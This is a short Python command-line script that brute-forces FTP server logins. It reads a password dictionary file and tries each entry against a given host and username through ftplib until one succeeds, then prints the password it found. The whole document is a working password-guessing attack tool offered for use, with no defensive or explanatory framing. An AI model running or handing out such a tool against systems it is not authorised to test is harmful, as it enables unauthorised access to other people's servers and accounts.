#!/usr/bin/python3
#-*- coding: utf-8 -*-

import ftplib
import argparse
from colors import *

parser = argparse.ArgumentParser(description='Bruteforce for FTP servers using a .txt dictionary')
parser.add_argument('-t', '--target', help="Specify a target (host)", required=True)
parser.add_argument('-u', '--user', help="FTP user", required=True)
parser.add_argument('-d', '--dict', help="Password dictionary (txt file)", required=True)
parser.add_argument('-p', '--port', help="Port to use (Optional, default 21)", type=int, default=21)
args = parser.parse_args()

target = args.target
user = args.user
port = args.port
pwd_dict_route = args.dict

# - Set password list to use - #
pwd_dict = set(open(pwd_dict_route).read().splitlines())

def bruteforce(target, user, pwd_dict):
    server = ftplib.FTP()
    for password in pwd_dict:
        password = password.strip('\n')
        print(f"{lblue}[-] {normal}Trying {password}")
        try:
            server.connect(target, port, timeout=15)
            server.login(user, password)

        except ftplib.error_perm:
            pass

        else:
            print(f"{lgreen}[+] {normal}Found password: {red}{password}\n")
            break

bruteforce(target, user, pwd_dict)